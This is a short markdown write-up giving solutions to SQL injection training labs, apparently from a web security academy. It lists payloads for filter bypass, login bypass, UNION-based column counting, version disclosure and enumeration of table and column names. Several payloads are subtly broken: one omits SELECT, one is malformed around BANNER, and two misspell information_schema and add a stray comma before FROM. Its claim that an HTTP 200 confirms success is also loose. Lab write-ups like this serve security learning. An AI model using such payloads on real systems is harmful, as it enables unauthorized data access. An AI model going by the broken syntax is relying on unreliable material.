# Solutions for SQL Injection Vuln Labs

1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

   - **Purpose** : Vulnerability is in the product filter by category.
   - **Payload**: `'+OR+1=1--`
   - **Description**: This payload will return all the data from the database because the WHERE clause will always be true.

2. SQL injection vulnerability allowing login bypass

   - **Purpose** : Vulnerability is in the login form.
   - **Payload**: `'+OR+1=1--`
   - **Description**: This payload will always return to true with everything in the query after -- will be commented. Thus logging in as the first user in the database i.e. admin.

3. SQLi attack displaying the no. of columns and then the version of database in oracle.

   - **Purpose** : Vulnerability is in the category filter.
   - **Payload**: `'+UNION+NULL,NULL+FROM+products--`
   - **Description**: This payload will return the number of columns in the database. In this case, it is 2.

   - **Payload**: `'+UNION+BANNER+NULL,NULL+FROM+dual--`
   - **Description**: This payload will return the version of the database. In this case, it is Oracle 11g.

4. SQLi attack displaying the no. of columns and then the version of database in MySQL and Microsoft.

   - **Purpose** : Vulnerability is in the category filter.
   - **Payload**: `'+UNION+SELECT+NULL,NULL#`
   - **Description**: This payload will return the number of columns in the database. In this case, it is 2. In Mysql the comment is represented by # instead of --.

   - **Payload**: `'+UNION+SELECT+@@version,+NULL#`
   - **Description**: This payload will return the version of the database. In this case, it is MySQL 5.0.12.

5. SQLi attack, listing the database contents on non-oracle database

    - The lab contains vulnerability in product filter category. 

    - To find the number of columns in the database perform test like this :

        - `'+UNION+SELECT+NULL,NULL#`
        - This test is for 2 columns, put 1,2,3 .. null in the query to check for these no. of columns.

        - If the app returns 200 then it is successful.

    - To get all tables in the database, use this command :

        - `'UNION+SELECT+table_name,+NULL,+FROM+information+schema.tables--`

    - To get the columns of the table use the command :

        - `'UNION+SELECT+column_name,+NULL,+FROM+information+schema.columns+WHERE+table_name='table_name'--`